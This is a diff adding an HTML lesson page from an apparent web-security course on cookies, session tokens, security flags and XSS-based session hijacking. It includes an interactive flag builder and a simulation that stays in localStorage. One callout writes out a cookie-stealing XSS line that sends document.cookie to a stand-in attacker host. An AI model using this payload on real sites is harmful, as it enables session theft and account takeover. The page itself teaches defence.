@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>2.2 — Cookies, Sessions & Hijacking · Web Security</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#0d1117; --bg-card:#161b22; --bg-hover:#1c2333;
+      --border:#30363d; --border-soft:#21262d;
+      --text:#cdd9e5; --text-muted:#768390; --text-bright:#f0f6fc;
+      --blue:#58a6ff; --blue-dark:#1f6feb;
+      --green:#3fb950; --green-dark:#238636;
+      --red:#f78166; --yellow:#e3b341; --purple:#bc8cff;
+    }
+    html { scroll-behavior:smooth; }
+    body { font-family:'Segoe UI',system-ui,sans-serif; background:var(--bg); color:var(--text); line-height:1.75; font-size:16px; }
+    a { color:var(--blue); text-decoration:none; }
+    a:hover { text-decoration:underline; }
+    p { margin-bottom:1rem; }
+    strong { color:var(--text-bright); }
+    code { background:var(--border-soft); color:var(--yellow); padding:0.15rem 0.45rem; border-radius:4px; font-family:'Courier New',monospace; font-size:0.875rem; }
+
+    /* NAV */
+    nav { background:var(--bg-card); border-bottom:1px solid var(--border); padding:0 2rem; height:52px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:100; }
+    .nav-left { display:flex; align-items:center; gap:0.5rem; font-size:0.875rem; color:var(--text-muted); }
+    .nav-left a { color:var(--text-muted); }
+    .nav-left a:hover { color:var(--blue); text-decoration:none; }
+    .nav-sep { color:var(--border); }
+    .nav-current { color:var(--text-bright); font-weight:600; }
+    .nav-right { display:flex; gap:0.5rem; }
+    .nav-btn { background:var(--bg-hover); border:1px solid var(--border); color:var(--text-muted); padding:0.3rem 0.9rem; border-radius:6px; font-size:0.8rem; text-decoration:none; transition:background 0.15s; }
+    .nav-btn:hover { background:var(--border); color:var(--text-bright); text-decoration:none; }
+    .nav-btn.next { background:var(--green-dark); color:#fff; border-color:var(--green-dark); }
+    .nav-btn.next:hover { background:var(--green); }
+
+    /* HEADER */
+    .page-header { background:linear-gradient(160deg,#1a0e2e 0%,#0d1117 65%); border-bottom:1px solid var(--border); padding:2.5rem 2rem 2rem; max-width:900px; margin:0 auto; }
+    .module-tag { display:inline-block; background:#1e1228; border:1px solid #7c3aed55; color:var(--purple); font-size:0.72rem; font-weight:600; letter-spacing:0.08em; text-transform:uppercase; padding:0.25rem 0.75rem; border-radius:20px; margin-bottom:0.75rem; }
+    .page-header h1 { font-size:1.9rem; font-weight:900; color:var(--text-bright); margin-bottom:0.5rem; letter-spacing:-0.02em; }
+    .page-header p { color:var(--text-muted); font-size:1rem; max-width:620px; }
+    .header-meta { display:flex; gap:1rem; margin-top:1rem; flex-wrap:wrap; }
+    .header-meta span { font-size:0.8rem; color:var(--text-muted); background:var(--bg-card); border:1px solid var(--border-soft); padding:0.2rem 0.75rem; border-radius:20px; }
+
+    /* CONTENT */
+    .content { max-width:900px; margin:0 auto; padding:2rem 2rem 4rem; }
+    .section-heading { font-size:1.2rem; font-weight:800; color:var(--text-bright); margin:2.75rem 0 1rem; padding-bottom:0.4rem; border-bottom:1px solid var(--border-soft); display:flex; align-items:center; gap:0.5rem; }
+
+    /* CALLOUTS */
+    .callout { border-radius:8px; padding:1rem 1.25rem; margin:1.5rem 0; border-left:4px solid; font-size:0.925rem; line-height:1.7; }
+    .callout-title { font-weight:700; font-size:0.78rem; text-transform:uppercase; letter-spacing:0.07em; margin-bottom:0.5rem; }
+    .callout.security { background:#1a0e0e; border-color:var(--red); }
+    .callout.security .callout-title { color:var(--red); }
+    .callout.tip  { background:#0e1a12; border-color:var(--green); }
+    .callout.tip .callout-title  { color:var(--green); }
+    .callout.info { background:#0d1b2e; border-color:var(--blue); }
+    .callout.info .callout-title { color:var(--blue); }
+    .callout.warning { background:#1a1500; border-color:var(--yellow); }
+    .callout.warning .callout-title { color:var(--yellow); }
+
+    /* TABLE */
+    table { width:100%; border-collapse:collapse; margin:1.25rem 0; font-size:0.9rem; }
+    thead tr { background:var(--border-soft); }
+    th { padding:0.65rem 1rem; color:var(--purple); text-align:left; font-size:0.78rem; text-transform:uppercase; letter-spacing:0.06em; border:1px solid var(--border); }
+    td { padding:0.65rem 1rem; border:1px solid var(--border); color:var(--text); vertical-align:top; }
+    tbody tr:nth-child(even) { background:#0a0e13; }
+    tbody tr:hover { background:var(--bg-hover); }
+
+    /* HTTP BLOCK */
+    .http-block { background:var(--bg); border:1px solid var(--border); border-radius:8px; overflow:hidden; margin:1.25rem 0; font-family:'Courier New',monospace; font-size:0.83rem; line-height:1.9; }
+    .http-bar { background:var(--border-soft); padding:0.4rem 1rem; font-size:0.72rem; color:var(--text-muted); display:flex; align-items:center; gap:6px; }
+    .hb-dot { width:10px; height:10px; border-radius:50%; display:inline-block; }
+    .hb-r{background:#f78166;} .hb-y{background:#e3b341;} .hb-g{background:#3fb950;}
+    .http-body { padding:1rem 1.25rem; overflow-x:auto; }
+    .hl-method  { color:#79c0ff; font-weight:700; }
+    .hl-url     { color:var(--green); }
+    .hl-header  { color:var(--purple); }
+    .hl-value   { color:var(--yellow); }
+    .hl-cookie  { color:var(--red); }
+    .hl-comment { color:var(--text-muted); font-style:italic; }
+    .hl-safe    { color:var(--green); }
+
+    /* COOKIE BUILDER */
+    .cookie-builder { background:var(--bg-card); border:1px solid var(--border); border-radius:10px; overflow:hidden; margin:1.5rem 0; }
+    .cb-header { background:var(--border-soft); padding:0.75rem 1.25rem; font-size:0.85rem; color:var(--text-muted); }
+    .cb-body { display:grid; grid-template-columns:1fr 1fr; }
+    @media(max-width:600px){ .cb-body{grid-template-columns:1fr;} }
+    .cb-controls { padding:1.25rem; border-right:1px solid var(--border); }
+    .cb-field-row { display:flex; align-items:center; justify-content:space-between; margin-bottom:0.75rem; }
+    .cb-field-label { font-size:0.85rem; color:var(--text-muted); }
+    .cb-toggle { position:relative; display:inline-block; width:40px; height:22px; }
+    .cb-toggle input { opacity:0; width:0; height:0; }
+    .cb-slider { position:absolute; cursor:pointer; inset:0; background:var(--border); border-radius:22px; transition:0.2s; }
+    .cb-slider:before { position:absolute; content:""; height:16px; width:16px; left:3px; bottom:3px; background:#fff; border-radius:50%; transition:0.2s; }
+    .cb-toggle input:checked + .cb-slider { background:var(--green-dark); }
+    .cb-toggle input:checked + .cb-slider:before { transform:translateX(18px); }
+    .cb-name-input { width:100%; background:var(--bg); border:1px solid var(--border); color:var(--text); padding:0.45rem 0.75rem; border-radius:6px; font-size:0.875rem; margin-bottom:0.5rem; outline:none; font-family:'Courier New',monospace; }
+    .cb-name-input:focus { border-color:var(--blue); }
+    .cb-result-pane { padding:1.25rem; background:var(--bg); }
+    .cb-result-label { font-size:0.72rem; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.06em; margin-bottom:0.5rem; }
+    .cb-result-code { font-family:'Courier New',monospace; font-size:0.82rem; background:var(--bg-card); border:1px solid var(--border); border-radius:6px; padding:0.75rem 1rem; color:var(--text); word-break:break-all; line-height:1.7; white-space:pre-wrap; }
+    .cb-risk { margin-top:0.75rem; padding:0.65rem 0.9rem; border-radius:6px; font-size:0.82rem; line-height:1.6; border:1px solid; }
+    .risk-high { background:#1a0e0e; border-color:#b91c1c55; color:var(--red); }
+    .risk-low  { background:#0e1a12; border-color:#23863655; color:var(--green); }
+
+    /* SESSION FLOW */
+    .session-flow { margin:1.5rem 0; display:flex; flex-direction:column; gap:0; }
+    .sf-step { display:flex; gap:1.25rem; }
+    .sf-left { display:flex; flex-direction:column; align-items:center; flex-shrink:0; }
+    .sf-num  { width:30px; height:30px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:0.78rem; font-weight:800; border:2px solid; flex-shrink:0; }
+    .sf-line { flex:1; width:2px; background:var(--border-soft); margin:3px 0; min-height:18px; }
+    .sf-body { padding-bottom:1.1rem; flex:1; }
+    .sf-body h4 { font-size:0.9rem; font-weight:700; color:var(--text-bright); margin-bottom:0.2rem; }
+    .sf-body p  { font-size:0.855rem; color:var(--text-muted); margin:0; line-height:1.6; }
+    .sn-blue   { background:#1f2d3d; color:var(--blue);   border-color:var(--blue); }
+    .sn-green  { background:#0e1a12; color:var(--green);  border-color:var(--green); }
+    .sn-yellow { background:#1a1500; color:var(--yellow); border-color:var(--yellow); }
+    .sn-red    { background:#1a0e0e; color:var(--red);    border-color:var(--red); }
+
+    /* HIJACK SIM */
+    .hijack-sim { background:var(--bg-card); border:1px solid var(--border); border-radius:10px; overflow:hidden; margin:1.5rem 0; }
+    .hs-header { background:var(--border-soft); padding:0.75rem 1.25rem; font-size:0.85rem; color:var(--text-muted); display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:0.5rem; }
+    .hs-steps { display:grid; grid-template-columns:1fr 1fr 1fr; border-bottom:1px solid var(--border); }
+    @media(max-width:640px){ .hs-steps{grid-template-columns:1fr;} }
+    .hs-step { padding:1rem 1.25rem; border-right:1px solid var(--border); }
+    .hs-step:last-child { border-right:none; }
+    .hs-step-num { font-size:0.72rem; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.07em; margin-bottom:0.4rem; }
+    .hs-step-title { font-size:0.875rem; font-weight:700; color:var(--text-bright); margin-bottom:0.5rem; }
+    .hs-step p { font-size:0.82rem; color:var(--text-muted); line-height:1.6; margin:0; }
+    .hs-demo { padding:1.25rem; }
+    .hs-demo-label { font-size:0.78rem; color:var(--text-muted); text-transform:uppercase; letter-spacing:0.06em; margin-bottom:0.5rem; }
+    .hs-token-row { display:flex; align-items:center; gap:0.75rem; flex-wrap:wrap; margin-bottom:0.75rem; }
+    .hs-token { font-family:'Courier New',monospace; font-size:0.82rem; background:var(--bg); border:1px solid var(--border); padding:0.45rem 0.75rem; border-radius:6px; color:var(--yellow); flex:1; min-width:180px; }
+    .hs-btn { font-size:0.8rem; font-weight:600; padding:0.4rem 1rem; border-radius:6px; cursor:pointer; border:none; color:#fff; transition:background 0.15s; white-space:nowrap; }
+    .hs-btn-steal  { background:#b91c1c; }
+    .hs-btn-steal:hover  { background:var(--red); }
+    .hs-btn-fix    { background:var(--green-dark); }
+    .hs-btn-fix:hover    { background:var(--green); }
+    .hs-btn-reset  { background:var(--border); color:var(--text-muted); }
+    .hs-btn-reset:hover  { background:var(--border-soft); color:var(--text-bright); }
+    .hs-log { background:var(--bg); border:1px solid var(--border); border-radius:6px; min-height:80px; padding:0.75rem 1rem; font-family:'Courier New',monospace; font-size:0.8rem; line-height:1.8; }
+    .log-normal  { color:var(--text-muted); }
+    .log-stolen  { color:var(--red); }
+    .log-safe    { color:var(--green); }
+    .log-warning { color:var(--yellow); }
+
+    /* FLAGS TABLE */
+    .flags-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:1rem; margin:1.25rem 0; }
+    .flag-card { background:var(--bg-card); border:1px solid var(--border); border-radius:8px; padding:1.1rem 1.25rem; }
+    .flag-name { font-family:'Courier New',monospace; font-size:0.875rem; color:var(--yellow); font-weight:700; margin-bottom:0.35rem; }
+    .flag-desc { font-size:0.82rem; color:var(--text-muted); line-height:1.6; }
+    .flag-verdict { display:inline-block; font-size:0.7rem; font-weight:700; margin-top:0.5rem; padding:0.15rem 0.55rem; border-radius:20px; }
+    .fv-must { background:#0e1a12; color:var(--green); border:1px solid #23863655; }
+    .fv-should { background:#1a1500; color:var(--yellow); border:1px solid #b0880055; }
+    .fv-avoid { background:#1a0e0e; color:var(--red); border:1px solid #b91c1c55; }
+
+    /* BOTTOM NAV */
+    .bottom-nav { display:flex; justify-content:space-between; align-items:center; margin-top:3rem; padding-top:2rem; border-top:1px solid var(--border-soft); gap:1rem; flex-wrap:wrap; }
+    .bottom-nav a { display:inline-flex; align-items:center; gap:0.5rem; padding:0.65rem 1.5rem; border-radius:8px; font-size:0.9rem; font-weight:600; text-decoration:none; transition:background 0.15s; }
+    .btn-back { background:var(--bg-card); border:1px solid var(--border); color:var(--text-muted); }
+    .btn-back:hover { background:var(--bg-hover); color:var(--text-bright); }
+    .btn-next { background:var(--green-dark); border:1px solid var(--green-dark); color:#fff; }
+    .btn-next:hover { background:var(--green); }
+  </style>
+</head>
+<body>
+
+  <!-- NAV -->
+  <nav>
+    <div class="nav-left">
+      <a href="../index.html">🛡️ Web Security</a>
+      <span class="nav-sep">›</span>
+      <a href="#">Module 2</a>
+      <span class="nav-sep">›</span>
+      <span class="nav-current">2.2 — Cookies, Sessions &amp; Hijacking</span>
+    </div>
+    <div class="nav-right">
+      <a class="nav-btn" href="2-1.html">← 2.1 The DOM</a>
+      <a class="nav-btn next" href="2-3.html">Next: HTTP Headers →</a>
+    </div>
+  </nav>
+
+  <!-- HEADER -->
+  <div class="page-header">
+    <div class="module-tag">Module 2 · Sub-module 2.2</div>
+    <h1>🍪 Cookies, Sessions &amp; Hijacking</h1>
+    <p>Cookies are how websites remember who you are. Session tokens inside cookies are the keys to your account. XSS steals those keys — and with them, the attacker becomes you.</p>
+    <div class="header-meta">
+      <span>⏱️ ~20 minutes</span>
+      <span>📖 Reading + Interactive</span>
+      <span>⚡ Live simulation</span>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <!-- ══ SECTION 1 — What Cookies Are ══ -->
+    <div class="section-heading">🍪 What Cookies Are and Why They Exist</div>
+
+    <p>HTTP is a <strong>stateless protocol</strong> — each request is independent. The server has no built-in memory of previous requests. When you log in, how does the server know the next page request is also from you?</p>
+
+    <p>The answer is <strong>cookies</strong>. After login, the server sends a <code>Set-Cookie</code> header with a unique token. The browser stores it and automatically attaches it to every subsequent request to that domain. The server reads it, looks up the session, and knows who you are.</p>
+
+    <p>This is elegant and practical. It is also the reason that <strong>stealing a cookie = stealing an identity</strong>. The attacker does not need your password — they just need your token.</p>
+
+    <!-- HTTP exchange showing cookie flow -->
+    <div class="http-block">
+      <div class="http-bar">
+        <span class="hb-dot hb-r"></span><span class="hb-dot hb-y"></span><span class="hb-dot hb-g"></span>
+        Step 1 — Login request
+      </div>
+      <div class="http-body">
+<span class="hl-method">POST</span> <span class="hl-url">/login</span> HTTP/1.1<br>
+<span class="hl-header">Host:</span> <span class="hl-value">bank.example.com</span><br>
+<span class="hl-header">Content-Type:</span> <span class="hl-value">application/x-www-form-urlencoded</span><br>
+<br>
+username=alice&amp;password=hunter2
+      </div>
+    </div>
+
+    <div class="http-block">
+      <div class="http-bar">
+        <span class="hb-dot hb-r"></span><span class="hb-dot hb-y"></span><span class="hb-dot hb-g"></span>
+        Step 2 — Server response: sets a session cookie
+      </div>
+      <div class="http-body">
+HTTP/1.1 <span class="hl-safe">302 Found</span><br>
+<span class="hl-header">Location:</span> <span class="hl-value">/dashboard</span><br>
+<span class="hl-header">Set-Cookie:</span> <span class="hl-cookie">sessionid=a3f9b2c1d8e74f6a; Path=/; HttpOnly; Secure; SameSite=Strict</span><br>
+<span class="hl-comment">← browser stores this, sends it on every request</span>
+      </div>
+    </div>
+
+    <div class="http-block">
+      <div class="http-bar">
+        <span class="hb-dot hb-r"></span><span class="hb-dot hb-y"></span><span class="hb-dot hb-g"></span>
+        Step 3 — Every subsequent request carries the cookie automatically
+      </div>
+      <div class="http-body">
+<span class="hl-method">GET</span> <span class="hl-url">/dashboard</span> HTTP/1.1<br>
+<span class="hl-header">Host:</span> <span class="hl-value">bank.example.com</span><br>
+<span class="hl-header">Cookie:</span> <span class="hl-cookie">sessionid=a3f9b2c1d8e74f6a</span><br>
+<span class="hl-comment">← server reads this, looks it up, knows it's Alice</span>
+      </div>
+    </div>
+
+    <div class="callout info">
+      <div class="callout-title">ℹ️ The cookie is the identity</div>
+      The server does not know your name, your IP, or anything about you on each request —
+      it only knows your <strong>session token</strong>. If an attacker has that token,
+      they can paste it into their own browser and the server will treat them as you.
+      No password needed. No 2FA bypass needed. Just the token.
+    </div>
+
+
+    <!-- ══ SECTION 2 — Cookie Flags ══ -->
+    <div class="section-heading">🚩 Security Flags — The Lines That Protect Cookies</div>
+
+    <p>
+      Every cookie can carry optional security flags in its <code>Set-Cookie</code> header.
+      These flags are the difference between a cookie that can be stolen by XSS and one that cannot.
+      Missing a single flag can undo everything else.
+    </p>
+
+    <div class="flags-grid">
+
+      <div class="flag-card">
+        <div class="flag-name">HttpOnly</div>
+        <div class="flag-desc">Prevents JavaScript from reading the cookie via <code>document.cookie</code>. Even if XSS is present, the attacker's script cannot access this cookie. This is the single most important flag for session tokens.</div>
+        <div class="flag-verdict fv-must">✅ Always set on session tokens</div>
+      </div>
+
+      <div class="flag-card">
+        <div class="flag-name">Secure</div>
+        <div class="flag-desc">Cookie is only sent over HTTPS connections — never over plain HTTP. Prevents cookie theft via network eavesdropping (man-in-the-middle on HTTP). Useless without HTTPS on your site.</div>
+        <div class="flag-verdict fv-must">✅ Always set in production</div>
+      </div>
+
+      <div class="flag-card">
+        <div class="flag-name">SameSite=Strict</div>
+        <div class="flag-desc">Cookie is never sent on cross-site requests. Completely blocks CSRF attacks — the attacker's page cannot trigger authenticated requests because the browser withholds the cookie.</div>
+        <div class="flag-verdict fv-must">✅ Best CSRF protection</div>
+      </div>
+
+      <div class="flag-card">
+        <div class="flag-name">SameSite=Lax</div>
+        <div class="flag-desc">Cookie is sent on top-level navigations (clicking links) but not on cross-site subresource requests. A balanced default — most browsers now use Lax when SameSite is not set.</div>
+        <div class="flag-verdict fv-should">⚠️ Good default, not perfect</div>
+      </div>
+
+      <div class="flag-card">
+        <div class="flag-name">SameSite=None</div>
+        <div class="flag-desc">Cookie is sent on all requests including cross-site. Required for embedded widgets and third-party integrations, but opens the door to CSRF. Must be combined with <code>Secure</code>.</div>
+        <div class="flag-verdict fv-avoid">⚠️ Only when necessary</div>
+      </div>
+
+      <div class="flag-card">
+        <div class="flag-name">Expires / Max-Age</div>
+        <div class="flag-desc">Controls how long the cookie lives. Session cookies (no Expires) die when the browser closes. Persistent cookies with long expiry survive restarts — a stolen persistent cookie stays valid longer.</div>
+        <div class="flag-verdict fv-should">⚠️ Keep session tokens short-lived</div>
+      </div>
+
+    </div>
+
+    <!-- Interactive cookie builder -->
+    <div class="cookie-builder">
+      <div class="cb-header">🛠️ Cookie Flag Builder — toggle flags to see the Set-Cookie header and risk level change</div>
+      <div class="cb-body">
+        <div class="cb-controls">
+          <div style="font-size:0.78rem;color:var(--text-muted);margin-bottom:0.75rem;">Cookie name:</div>
+          <input class="cb-name-input" id="cbName" type="text" value="sessionid" oninput="buildCookie()">
+
+          <div style="font-size:0.78rem;color:var(--text-muted);margin-bottom:0.75rem;margin-top:0.25rem;">Security flags:</div>
+
+          <div class="cb-field-row">
+            <span class="cb-field-label"><code>HttpOnly</code></span>
+            <label class="cb-toggle"><input type="checkbox" id="cbHttpOnly" checked onchange="buildCookie()"><span class="cb-slider"></span></label>
+          </div>
+          <div class="cb-field-row">
+            <span class="cb-field-label"><code>Secure</code></span>
+            <label class="cb-toggle"><input type="checkbox" id="cbSecure" checked onchange="buildCookie()"><span class="cb-slider"></span></label>
+          </div>
+          <div class="cb-field-row">
+            <span class="cb-field-label"><code>SameSite=Strict</code></span>
+            <label class="cb-toggle"><input type="checkbox" id="cbSameSite" checked onchange="buildCookie()"><span class="cb-slider"></span></label>
+          </div>
+          <div class="cb-field-row">
+            <span class="cb-field-label"><code>Expires</code> (persistent)</span>
+            <label class="cb-toggle"><input type="checkbox" id="cbExpires" onchange="buildCookie()"><span class="cb-slider"></span></label>
+          </div>
+        </div>
+        <div class="cb-result-pane">
+          <div class="cb-result-label">Generated Set-Cookie header:</div>
+          <div class="cb-result-code" id="cbOutput"></div>
+          <div class="cb-risk" id="cbRisk"></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout security">
+      <div class="callout-title">🔐 The XSS + Missing HttpOnly Combination</div>
+      When <code>HttpOnly</code> is missing, any XSS payload can run
+      <code>document.cookie</code> and read the session token directly.
+      The attacker sends it to their server with a single line:
+      <code>new Image().src='https://attacker.com/steal?c='+document.cookie</code>.
+      The victim never sees anything. The attacker now has a valid session.
+      Toggle off <code>HttpOnly</code> in the builder above and observe the risk change.
+    </div>
+
+
+    <!-- ══ SECTION 3 — Session Lifecycle ══ -->
+    <div class="section-heading">🔄 The Session Lifecycle</div>
+
+    <p>Understanding the full lifecycle of a session — from login to logout — reveals exactly where attacks are possible and why the fixes work.</p>
+
+    <div class="session-flow">
+      <div class="sf-step">
+        <div class="sf-left"><div class="sf-num sn-blue">1</div><div class="sf-line"></div></div>
+        <div class="sf-body">
+          <h4>User logs in — credentials verified</h4>
+          <p>Server checks username and password. If valid, generates a <strong>random, unpredictable session token</strong> (e.g. a cryptographically secure 128-bit random value).</p>
+        </div>
+      </div>
+      <div class="sf-step">
+        <div class="sf-left"><div class="sf-num sn-blue">2</div><div class="sf-line"></div></div>
+        <div class="sf-body">
+          <h4>Server stores token and sends it to browser</h4>
+          <p>Token is stored server-side (database or cache) mapped to the user. Sent to browser via <code>Set-Cookie: sessionid=TOKEN; HttpOnly; Secure; SameSite=Strict</code>.</p>
+        </div>
+      </div>
+      <div class="sf-step">
+        <div class="sf-left"><div class="sf-num sn-green">3</div><div class="sf-line"></div></div>
+        <div class="sf-body">
+          <h4>Browser attaches cookie to every request automatically</h4>
+          <p>No developer code needed. The browser handles this. Every GET, POST, AJAX request to the same domain carries the cookie in the <code>Cookie:</code> header.</p>
+        </div>
+      </div>
+      <div class="sf-step">
+        <div class="sf-left"><div class="sf-num sn-yellow">4</div><div class="sf-line"></div></div>
+        <div class="sf-body">
+          <h4>Server validates token on every request</h4>
+          <p>Server reads cookie, looks up token in session store, retrieves the associated user. If token is valid → request is authorised. If missing or invalid → redirect to login.</p>
+        </div>
+      </div>
+      <div class="sf-step">
+        <div class="sf-left"><div class="sf-num sn-red">5</div><div class="sf-line"></div></div>
+        <div class="sf-body">
+          <h4>XSS attack — token stolen mid-session</h4>
+          <p>If XSS fires while the user is logged in, attacker's script runs <code>document.cookie</code>, reads the token, and exfiltrates it. The server has no way to detect this.</p>
+        </div>
+      </div>
+      <div class="sf-step">
+        <div class="sf-left"><div class="sf-num sn-green">6</div></div>
+        <div class="sf-body">
+          <h4>Logout — server invalidates the token</h4>
+          <p>Proper logout deletes the session server-side. Even if the attacker already has the token, it becomes useless. This is why client-side-only logout (just deleting the cookie) is insufficient.</p>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- ══ SECTION 4 — Cookie Theft Simulation ══ -->
+    <div class="section-heading">🎭 Cookie Theft Simulation</div>
+
+    <p>This simulation shows the exact mechanics of XSS-based session hijacking. You are the attacker. The victim is logged in. Your goal: steal their session token and use it.</p>
+
+    <div class="hijack-sim">
+      <div class="hs-header">
+        <span>🎭 Session Hijacking Simulation</span>
+        <span style="font-size:0.78rem;color:var(--text-muted);">Safe — runs in localStorage only, no real network requests</span>
+      </div>
+
+      <div class="hs-steps">
+        <div class="hs-step">
+          <div class="hs-step-num">Step 1</div>
+          <div class="hs-step-title">Victim is logged in</div>
+          <p>A session cookie is set in localStorage simulating <code>document.cookie</code>. The <code>HttpOnly</code> flag controls whether JS can read it.</p>
+        </div>
+        <div class="hs-step">
+          <div class="hs-step-num">Step 2</div>
+          <div class="hs-step-title">XSS fires</div>
+          <p>An injected script reads the cookie and sends it to the attacker's server. In this simulation, it "sends" it to the log below.</p>
+        </div>
+        <div class="hs-step">
+          <div class="hs-step-num">Step 3</div>
+          <div class="hs-step-title">Attacker uses token</div>
+          <p>The attacker pastes the token into their own browser. The server sees a valid token and grants full access — no password required.</p>
+        </div>
+      </div>
+
+      <div class="hs-demo">
+        <div class="hs-demo-label">Victim's current session token:</div>
+        <div class="hs-token-row">
+          <div class="hs-token" id="hsToken">Click "Create Session" to generate a token</div>
+          <button class="hs-btn hs-btn-fix" onclick="createSession()">🔑 Create Session</button>
+        </div>
+
+        <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
+          <label style="display:flex;align-items:center;gap:0.5rem;font-size:0.875rem;color:var(--text-muted);cursor:pointer;">
+            <input type="checkbox" id="hsHttpOnly" style="accent-color:var(--blue);">
+            Simulate <code>HttpOnly</code> flag
+          </label>
+          <span style="font-size:0.8rem;color:var(--text-muted);">— when checked, JS cannot read the cookie</span>
+        </div>
+
+        <div style="display:flex;gap:0.5rem;flex-wrap:wrap;margin-bottom:0.75rem;">
+          <button class="hs-btn hs-btn-steal" onclick="stealCookie()">💉 Fire XSS — Steal Cookie</button>
+          <button class="hs-btn hs-btn-fix"   onclick="useToken()">🕵️ Use Stolen Token</button>
+          <button class="hs-btn hs-btn-reset" onclick="resetSim()">↺ Reset</button>
+        </div>
+
+        <div class="hs-demo-label">Attacker's console log:</div>
+        <div class="hs-log" id="hsLog">
+          <span class="log-normal">Waiting for action...</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="callout tip">
+      <div class="callout-title">💡 What to observe</div>
+      1. Create a session — a token appears<br>
+      2. Click "Fire XSS" without HttpOnly — token is stolen and logged<br>
+      3. Reset and enable the HttpOnly checkbox<br>
+      4. Click "Fire XSS" again — the cookie is now unreadable, attack fails<br>
+      5. This single flag stops the most common XSS cookie theft attack
+    </div>
+
+
+    <!-- ══ SECTION 5 — What Attackers Do With Stolen Cookies ══ -->
+    <div class="section-heading">🕵️ What Happens After the Token Is Stolen</div>
+
+    <table>
+      <thead><tr><th>Action</th><th>How it works</th><th>Defence</th></tr></thead>
+      <tbody>
+        <tr>
+          <td><strong>Session Replay</strong></td>
+          <td>Attacker pastes stolen token into browser DevTools → Application → Cookies and reloads. Server grants full access immediately.</td>
+          <td>Short session expiry, IP binding (limited), re-authentication for sensitive actions</td>
+        </tr>
+        <tr>
+          <td><strong>Account Takeover</strong></td>
+          <td>Attacker changes email/password while in the victim's session, locking them out permanently.</td>
+          <td>Require current password confirmation for credential changes</td>
+        </tr>
+        <tr>
+          <td><strong>Data Exfiltration</strong></td>
+          <td>Attacker silently downloads all data the victim has access to — emails, files, records.</td>
+          <td>Anomaly detection, rate limiting, session activity logging</td>
+        </tr>
+        <tr>
+          <td><strong>Privilege Escalation</strong></td>
+          <td>If the victim is an admin, the attacker inherits admin privileges. Can create new admin accounts.</td>
+          <td>Separate admin sessions, step-up authentication for admin functions</td>
+        </tr>
+        <tr>
+          <td><strong>Stored XSS Propagation</strong></td>
+          <td>Attacker uses admin access to inject Stored XSS that steals tokens from all subsequent visitors.</td>
+          <td>Output encoding everywhere, strict CSP, regular code audits</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="callout warning">
+      <div class="callout-title">⚠️ The attack chain in practice</div>
+      A single stored XSS in a comment field + missing HttpOnly flag + admin visiting the page
+      = attacker has admin session token. From there: create a backdoor admin account,
+      download all user data, inject more XSS. The entire breach traces back to one
+      missing flag and one unescaped <code>&lt;</code> character.
+    </div>
+
+    <div class="bottom-nav">
+      <a class="btn-back" href="2-1.html">← 2.1 The DOM &amp; JavaScript</a>
+      <a class="btn-next" href="2-3.html">Next: 2.3 HTTP Headers →</a>
+    </div>
+
+  </div>
+
+
+  <script>
+
+    // ── Helpers ──────────────────────────────────────────
+    function esc(s) {
+      return String(s)
+        .replace(/&/g,'&amp;')
+        .replace(/</g,'&lt;')
+        .replace(/>/g,'&gt;');
+    }
+
+    function randToken() {
+      var chars = 'abcdef0123456789';
+      var t = '';
+      for (var i = 0; i < 32; i++) {
+        t += chars[Math.floor(Math.random() * chars.length)];
+      }
+      return t;
+    }
+
+    // ── Cookie Builder ────────────────────────────────────
+    function buildCookie() {
+      var name     = document.getElementById('cbName').value || 'sessionid';
+      var httpOnly = document.getElementById('cbHttpOnly').checked;
+      var secure   = document.getElementById('cbSecure').checked;
+      var sameSite = document.getElementById('cbSameSite').checked;
+      var expires  = document.getElementById('cbExpires').checked;
+
+      var token = 'a3f9b2c1d8e74f6a98d1e2f3';
+      var line  = 'Set-Cookie: ' + name + '=' + token;
+      line += '; Path=/';
+      if (expires) line += '; Expires=Fri, 31 Dec 2027 23:59:59 GMT';
+      if (httpOnly) line += '; HttpOnly';
+      if (secure)   line += '; Secure';
+      if (sameSite) line += '; SameSite=Strict';
+
+      document.getElementById('cbOutput').textContent = line;
+
+      var risks = [];
+      var safe  = [];
+      if (!httpOnly) risks.push('JavaScript CAN read this cookie — XSS can steal it with document.cookie');
+      else safe.push('HttpOnly: JS cannot read this cookie — XSS cookie theft blocked');
+      if (!secure)   risks.push('Sent over HTTP — vulnerable to network interception');
+      else safe.push('Secure: only sent over HTTPS');
+      if (!sameSite) risks.push('No SameSite — vulnerable to CSRF attacks');
+      else safe.push('SameSite=Strict: CSRF blocked');
+      if (expires)   risks.push('Persistent cookie — stolen token stays valid until expiry');
+
+      var riskEl = document.getElementById('cbRisk');
+      if (risks.length === 0) {
+        riskEl.className = 'cb-risk risk-low';
+        riskEl.innerHTML = '✅ <strong>Well-configured</strong><br>' + safe.join('<br>');
+      } else {
+        riskEl.className = 'cb-risk risk-high';
+        riskEl.innerHTML = '⚠️ <strong>Issues found:</strong><br>' + risks.join('<br>') +
+          (safe.length ? '<br><br>✅ ' + safe.join('<br>✅ ') : '');
+      }
+    }
+
+    // ── Session Hijack Simulation ─────────────────────────
+    var simToken = null;
+
+    function log(msg, cls) {
+      var el = document.getElementById('hsLog');
+      var line = document.createElement('div');
+      line.className = cls || 'log-normal';
+      line.textContent = msg;
+      el.appendChild(line);
+      el.scrollTop = el.scrollHeight;
+    }
+
+    function clearLog() {
+      document.getElementById('hsLog').innerHTML = '';
+    }
+
+    function createSession() {
+      simToken = randToken();
+      localStorage.setItem('wsec_sim_session', simToken);
+      document.getElementById('hsToken').textContent = 'sessionid=' + simToken;
+      clearLog();
+      log('[server] Session created for user: alice', 'log-normal');
